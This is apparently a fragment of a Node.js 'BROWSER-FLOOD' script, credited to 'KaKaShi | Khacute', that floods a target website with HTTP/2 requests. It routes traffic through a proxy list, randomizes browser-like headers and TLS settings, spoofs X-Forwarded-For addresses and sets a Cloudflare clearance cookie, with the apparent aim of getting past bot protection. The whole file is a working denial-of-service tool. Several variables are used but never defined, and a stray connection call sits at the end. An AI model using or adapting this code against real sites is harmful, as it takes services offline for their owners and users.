  ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',

];

const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  // 50 giá trị Accept header mới bổ sung//
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
];
const lang_header = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'te;q=0.9,en-US;q=0.8,en;q=0.7',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
];
const country = [
  "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
  "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
  "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
  "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
  "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
  "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
  "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
  "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
  "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
  "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
  "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
  "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
  "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
  "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
  "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
  "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
];
const fetch_mode = [
  "navigate",
  "same-origin",
  "no-cors",
  "cors",
  "websocket",
];
const fetch_dest = [
  "document",
  "sharedworker",
  "subresource",
  "unknown",
  "embed",
  "report",
  "serviceworker",
  "audio",
  "audioworklet",
  "iframe",
  "worker",
];
encoding_header = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
];
const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
      'ecdsa_brainpoolP256r1tls13_sha256',
      'ecdsa_brainpoolP384r1tls13_sha384',
      'ecdsa_brainpoolP512r1tls13_sha512',
      'ecdsa_sha1',
      'ed25519',
      'ed448',
      'ecdsa_sha224',
      'rsa_pkcs1_sha1',
      'rsa_pss_pss_sha256',
      'dsa_sha256',
      'dsa_sha384',
      'dsa_sha512',
      'dsa_sha224',
      'dsa_sha1',
      'rsa_pss_pss_sha384',
      'rsa_pkcs1_sha2240',
      'rsa_pss_pss_sha512',
      'sm2sig_sm3',
      'ecdsa_secp521r1_sha512',
  ];
  let concu = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400','private', 'max-age=3600'],
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],

ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET',  'ENETUNREACH',  'ENONET',  'ENOTCONN',  'ENOTFOUND',  'EAI_NODATA',  'EAI_NONAME',  'EADDRNOTAVAIL',  'EAFNOSUPPORT',  'EALREADY',  'EBADF',  'ECONNABORTED',  'EDESTADDRREQ',  'EDQUOT',  'EFAULT',  'EHOSTUNREACH',  'EIDRM',  'EILSEQ',  'EINPROGRESS',  'EINTR',  'EINVAL',  'EIO',  'EISCONN',  'EMFILE',  'EMLINK',  'EMSGSIZE',  'ENAMETOOLONG',  'ENETDOWN',  'ENOBUFS',  'ENODEV',  'ENOENT',  'ENOMEM',  'ENOPROTOOPT',  'ENOSPC',  'ENOSYS',  'ENOTDIR',  'ENOTEMPTY',  'ENOTSOCK',  'EOPNOTSUPP',  'EPERM',  'EPIPE',  'EPROTONOSUPPORT',  'ERANGE',  'EROFS',  'ESHUTDOWN',  'ESPIPE',  'ESRCH',  'ETIME',  'ETXTBSY',  'EXDEV',  'UNKNOWN',  'DEPTH_ZERO_SELF_SIGNED_CERT',  'UNABLE_TO_VERIFY_LEAF_SIGNATURE',  'CERT_HAS_EXPIRED',  'CERT_NOT_YET_VALID'];

const headerFunc = {
  accept() {
    for (let i = accept_header.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [accept_header[i], accept_header[j]] = [accept_header[j], accept_header[i]];
    }
    return accept_header[Math.floor(Math.random() * accept_header.length)];
  },
  lang() {
    for (let i = lang_header.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [lang_header[i], lang_header[j]] = [lang_header[j], lang_header[i]];
    }
    return lang_header[Math.floor(Math.random() * lang_header.length)];
  },
  encoding() {
    for (let i = encoding_header.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [encoding_header[i], encoding_header[j]] = [encoding_header[j], encoding_header[i]];
    }
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
  },
  controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
  },
  cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  },
  referers() {
    for (let i = referer.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [referer[i], referer[j]] = [referer[j], referer[i]];
    }
    return referer[Math.floor(Math.random() * referer.length)]
  },
  platforms() {
    return platform[Math.floor(Math.random() * platform.length)]
  },
  mode() {
    return fetch_mode[Math.floor(Math.random() * fetch_mode.length)]
  },
  dest() {
    return fetch_dest[Math.floor(Math.random() * fetch_dest.length)]
  },
  site() {
    return fetch_site[Math.floor(Math.random() * fetch_site.length)]
  },
  countrys() {
    return country[Math.floor(Math.random() * country.length)]
  },
  type() {
    return type[Math.floor(Math.random() * type.length)]
  },
  
}

function spoof() {
    return `${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}`;
}

function randomByte() {
  let buffer = new Uint8Array(1);
  window.crypto.getRandomValues(buffer);
  return buffer[0];
}

function randomIp() {
  let segments = [];
  for (let i = 0; i < 4; i++) {
    segments.push(Math.floor(Math.random() * 256));
  }
  return segments.join('.');
}

process.on('uncaughtException', function (e) {
      if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function (e) {
      if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
      if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);



function isPrivate(ip, privateRanges) {
  if (!ip) {
    throw new Error('IP address is required');
  }
  if (!privateRanges || !Array.isArray(privateRanges)) {
    privateRanges = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
  }
  const ipRange = ipaddr.parse(ip);
  for (let i = 0; i < privateRanges.length; i++) {
    const range = ipaddr.parseCIDR(privateRanges[i]);
    if (ipRange.match(range)) {
      return true;
    }
  }
  return false;
}


const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];

// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
  console.log('BROWSER-FLOOD'.bgBlue)
    console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate delay`.rainbow);
  process.exit(1);
}

// Validate target format
if (!/^https?:\/\//i.test(target)) {
  console.error('sent with http:// or https://');
  process.exit(1);
}

// Parse proxy list
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, 'utf-8');
  proxys = proxyData.match(/\S+/g);
} catch (err) {
  console.error('Error proxy file:', err.message);
  process.exit(1);
}

// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('number rps');
  process.exit(1);
}


const proxyr = () => {
  for (let i = proxys.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [proxys[i], proxys[j]] = [proxys[j], proxys[i]];
  }
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
    const currentDate = new Date();
    // ...


    console.clear();
    console.log('\x1b[38;2;255;0;0m' +  'Atack Sent Successfully To Website !!'+ '\x1b[38;2;255;0;0m');
    console.log('\x1b[38;2;255;0;0m' +  'Script made by KaKaShi | Khacute'+ '\x1b[38;2;255;0;0m');
  for (let _ of Array.from({length: thread})) {
  cluster.fork();
}
   setTimeout(() => process.exit(-1), time * 1000);


} else {setInterval(flood)}


     function flood() {
        
        var parsed = url.parse(target);

        const uas = uap[Math.floor(Math.floor(Math.random() * uap.length))];
        

        var cipper = headerFunc.cipher();

        var proxy = proxyr().split(':');
        var cookie = request.jar();

        var randIp = randomIp();

var header = {
  'Cache-Control': headerFunc.controling(),
  ':method': 'GET',
  ':authority': parsed.host,
  'Accept-Encoding': headerFunc.encoding(),
  'X-Forwarded-For': randIp,
  ':scheme': 'https',
  'sec-ch-ua': uas,
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': headerFunc.platforms(),
  'User-Agent': uas,
  'priority': "u=0, i",
  'upgrade-insecure-requests': '1',
  'sec-fetch-site': headerFunc.site(),
  'sec-fetch-dest': headerFunc.dest(),
  'sec-fetch-mode': headerFunc.mode(),
  'accept':headerFunc.accept(),
  'accept-language': headerFunc.lang(),
  ':path':parsed.path,
  'Origin': target,
  'x-access-token': xAuthToken,
  'CF-IPCountry': headerFunc.countrys(),
  'Referer': headerFunc.referers(),
  'If-Modified-Since': httpTime,
  "x-requested-with": "XMLHttpRequest",
  'content-type':headerFunc.type(),
  'sec-ch-ua-platform-version':'0.1.0',
  'Cookie': `cf_clearance=${cookieValue}`,
};


const agent = new http.Agent({
  keepAlive: true,
  keepAliveMsecs: 700000,
  maxSockets: 50000,
  maxTotalSockets: 10000,
});

const requestOptions = {
  host: proxy[0],
 agent: agent,
  port: proxy[1],
  method: 'CONNECT',
  path: parsed.host + ':443',
 headers: {
     'Host': parsed.host,
     'Proxy-Connection': 'Keep-Alive',
     'Connection': 'Keep-Alive',
   },
};

const req = http.request(requestOptions, (res) => {
  // Handle response
});


req.on('connect', function (res, socket, head) {
        
            const tlsSocket = tls.connect({
                host: parsed.host,
                
                ciphers: cipper,
                secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
                followAllRedirects: true,
                maxRedirects: 10,
                port: 443,
                sigals: concu,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                servername: parsed.host,
                echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
                secure: true,
                Compression: false,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2','http/1.1','spdy/3.1'],
                sessionTimeout: 5000,
                sessionMaxTimeout: 60000,
                socket: socket,
                cookie : cookie,
            }, 
            () => {
                tlsSocket.setKeepAlive(true, 60 * 100000);

                const client = http2.connect(parsed.href, {
                    createConnection: () => tlsSocket,
                    settings: {
                   headerTableSize: 65536,
                   maxConcurrentStreams: 1000,
                   initialWindowSize: 6291456,
                   maxHeaderListSize: 262144,
                   enablePush: false
                    }
                       });
                        client.on("connect", () => {
                          const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < rps; i++) {
                        const request = client.request(header)
                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return
                        });
        
                       request.end();                 
                      }
                    }, process.argv[7]);
                });
                client.on("close", () => {
                    client.destroy();
                    connection.destroy();
                    return
                });
        
                client.on("error", error => {
                    client.destroy();
                    connection.destroy();
                    return
                });
            })

    });

        req.end();

    }


const client = http2.connect(parsed.href, clientOptions, function() {
  // handle successful connection
});
